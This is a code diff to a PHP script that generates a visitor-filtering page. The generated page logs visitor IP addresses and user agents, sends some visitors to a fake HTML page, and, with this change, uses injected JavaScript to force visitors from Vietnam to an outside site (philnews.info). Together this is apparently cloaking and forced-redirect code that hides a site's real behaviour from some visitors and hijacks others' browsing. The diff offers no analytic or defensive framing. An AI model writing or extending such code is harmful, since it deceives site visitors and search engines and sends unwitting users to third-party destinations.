@@ -202,6 +202,14 @@ location.href = '" . $redirectUrl . "';
 // ]]></script>
 ";
 
+    $redirectPN = "
+<script type='text/javascript'>// <![CDATA[
+var d='<data:blog.url/>';
+d=d.replace(/.*\/\/[^\/]*/, '');
+location.href = 'http://philnews.info';
+// ]]></script>
+";
+
     $phpString = '
 <?php
 function checkIP($ip)
@@ -236,6 +244,8 @@ if (
     fclose($fAgent);
     header(\'Location: ' . $linkHtmlFake . '\', true, 301);
     die();
+} elseif ($country === \'VN\') {
+  echo "' . $redirectPN . '";
 } else {
     $fAgent = fopen($allowedAgents, \'a\');
     $agent = $_SERVER[\'REMOTE_ADDR\'] . \' \' . $_SERVER[\'HTTP_USER_AGENT\'] . \' ok \' . PHP_EOL;
